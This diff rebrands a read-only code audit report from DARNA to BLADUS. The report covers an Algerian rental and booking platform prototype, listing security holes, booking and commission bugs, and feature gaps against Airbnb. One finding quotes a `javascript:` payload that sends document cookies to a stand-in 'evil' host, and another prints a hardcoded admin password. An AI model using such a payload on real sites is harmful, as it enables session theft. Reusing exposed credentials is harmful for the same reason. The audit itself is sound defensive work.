@@ -1,4 +1,4 @@
-# DARNA, Full Code Audit Report
+# BLADUS, Full Code Audit Report
 
 **Date:** 2026-10-28 · **Scope:** `darna/frontend` (guest + host app), `darna/admin` (back-office), repo hygiene, Airbnb feature parity
 **Mode:** read-only, no source code was modified.
@@ -9,7 +9,7 @@
 
 ## 0. Executive summary
 
-DARNA has a **solid UI/product skeleton**: three verticals (stays, cars, experiences/agency trips) plus hotels and hostels, host onboarding, a host dashboard, messaging, wallet/commission, en/fr/ar with RTL, and a very broad admin panel (≈110 pages). TypeScript compiles cleanly in both apps and lint shows only hook-dependency warnings.
+BLADUS has a **solid UI/product skeleton**: three verticals (stays, cars, experiences/agency trips) plus hotels and hostels, host onboarding, a host dashboard, messaging, wallet/commission, en/fr/ar with RTL, and a very broad admin panel (≈110 pages). TypeScript compiles cleanly in both apps and lint shows only hook-dependency warnings.
 
 However, **it is a prototype, not a deployable product**:
 
@@ -99,7 +99,7 @@ Findings marked ✅ were re-checked by me directly in the code.
    - It takes `userId` from the request body, falling back to the hardcoded `"usr_yacine"` (`route.ts:14`).
    - It **auto-marks organizations as verified** (`route.ts:54`).
    - It passes the body's `listing` straight to `createListing` (mass assignment, see #12).
-5. ✅ **Open redirect / `javascript:` XSS on login.** `login/page.tsx:54-58` (and `:100-105`) does `window.location.href = callbackUrl`. With `?callbackUrl=javascript:fetch('//evil?c='+document.cookie)`, script runs on DARNA's origin after login.
+5. ✅ **Open redirect / `javascript:` XSS on login.** `login/page.tsx:54-58` (and `:100-105`) does `window.location.href = callbackUrl`. With `?callbackUrl=javascript:fetch('//evil?c='+document.cookie)`, script runs on BLADUS's origin after login.
 6. **Mutations run in the browser and never reach the server.**
    - About 20 `"use client"` components import `lib/data/*` directly (`ListingReservation`, `HotelHostelDetailClient`, `TripDetailClient`, `TripsClient`, `ReservationsClient`, `HostBookingsClient`, `HostListingsClient`, `AgencyTeam/Settings/TripsClient`, `MessagesClient`, `BecomeHostFlow`…).
    - Result: a guest books, sees "Reservation confirmed", lands on `/trips` (server-rendered), and the booking isn't there. The same happens to accept/decline, messages, team changes and org deletion.
@@ -156,7 +156,7 @@ Findings marked ✅ were re-checked by me directly in the code.
 | Medium    | **Timezone (Algeria UTC+1).** Dates are stored with `toISOString()`, so a Nov 15 check-in is saved as `2026-11-14T23:00Z`. `availableFrom` parsed as UTC rejects the first valid day. Back-to-back stays are hidden in search.                                                        | `ListingReservation.tsx:43-50,177`, `listings.ts:189`                                     |
 | Medium    | Request-to-book never expires. `expiresAt` is set but never enforced, and pending requests block dates forever.                                                                                                                                                                       | `reservations.ts:137-139`                                                                 |
 | Medium    | **Cancellation ignores policy.** Every cancellation is marked "refunded", even past stays. Stays never move to `completed`.                                                                                                                                                           | `reservations.ts:191-203`, `TripsClient.tsx:35-50`                                        |
-| Medium    | **Commission errors.** Commission is charged on the total _including_ DARNA's service fee and the cleaning fee. It is never reversed on cancel, is double-charged on re-confirm, and hotels get the agency rate.                                                                      | `reservations.ts:173-178,225`, `wallet.ts:383,400`                                        |
+| Medium    | **Commission errors.** Commission is charged on the total _including_ BLADUS's service fee and the cleaning fee. It is never reversed on cancel, is double-charged on re-confirm, and hotels get the agency rate.                                                                      | `reservations.ts:173-178,225`, `wallet.ts:383,400`                                        |
 | Medium    | Hotel and hostel hosts see empty bookings, listings and calendar pages, because only `"agency"` is treated as an org.                                                                                                                                                                 | `host/bookings                                                                            | listings | calendar/page.tsx` |
 | Medium    | Draft or unpublished listings and trips are public and bookable (no status filter).                                                                                                                                                                                                   | `listings.ts:12-22,199-217`, `trips.ts:66`                                                |
 | Medium    | Deleted listings reappear, because `getListings` re-merges `mockListings`.                                                                                                                                                                                                            | `listings.ts:17,276-280`                                                                  |
@@ -260,7 +260,7 @@ Findings marked ✅ were re-checked by me directly in the code.
 
 ### High
 
-5. ✅ **The login page pre-fills `admin@darna.dz` / `DarnaAdmin2026!`** (`login/page.tsx:21-22`) and shows one-click "quick account" buttons with passwords (`:137-151`).
+5. ✅ **The login page pre-fills `admin@bladus.dz` / `DarnaAdmin2026!`** (`login/page.tsx:21-22`) and shows one-click "quick account" buttons with passwords (`:137-151`).
 6. ✅ **Open redirect after login.** `router.push(searchParams.get("returnTo"))` is not validated (`login/page.tsx:19,41`).
 7. **Sessions can't be revoked.** Role and `isActive` are frozen in the JWT for 8 hours. `toggleMemberActive` and `updateMemberRole` modify `store.team`, but login checks `MOCK_ADMIN_ACCOUNTS`, so deactivated admins can still log in.
 8. ✅ **The rate limiter uses a constant IP** (`actions.ts:16`, `"197.200.45.12"`). Five bad attempts by anyone **lock out all admins**. There is no per-account limit and passwords are compared with plain `===`.
@@ -349,9 +349,9 @@ These need to be unified **before** building a shared backend:
 
 Sources: Airbnb newsroom (total price display standard since Apr 2025; 2025 Summer Release with Services and relaunched Experiences), Guesty, RentalScaleUp, Hostfully (review policy 2026).
 
-| Feature                                                                                                                                                                            | DARNA status                                                |
+| Feature                                                                                                                                                                            | BLADUS status                                                |
 | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
-| Category tabs, map search, photo gallery, amenities, location map, host "Today" dashboard, listing wizard, en/fr/ar + RTL, experiences, car rental (DARNA-only), admin back-office | **Done (mock)**                                             |
+| Category tabs, map search, photo gallery, amenities, location map, host "Today" dashboard, listing wizard, en/fr/ar + RTL, experiences, car rental (BLADUS-only), admin back-office | **Done (mock)**                                             |
 | Instant Book vs request-to-book                                                                                                                                                    | Done (mock), but requests never expire                      |
 | Filters                                                                                                                                                                            | Partial: no accessibility or family filters                 |
 | Guest types                                                                                                                                                                        | Partial: one counter, no adults/children/infants/pets split |
@@ -380,7 +380,7 @@ Sources: Airbnb newsroom (total price display standard since Apr 2025; 2025 Summ
 6. **Cancellation-policy engine** with dated refund cutoffs, wired to admin refunds.
 7. **Real backend and auth.** Supabase with RLS, phone OTP (important in Algeria), and CNI/passport verification.
 8. **Messaging and notifications.** Real-time messaging with attachments, plus SMS and push notifications.
-9. **A working "Report" flow** feeding admin moderation, and a published DARNA guarantee or trust policy.
+9. **A working "Report" flow** feeding admin moderation, and a published BLADUS guarantee or trust policy.
 10. **Host pricing tools.** Weekly/monthly/last-minute discounts, seasonal pricing (summer coast, Ramadan, Sahara winter), and real iCal import/export.
 
 **Algeria-specific ideas:**
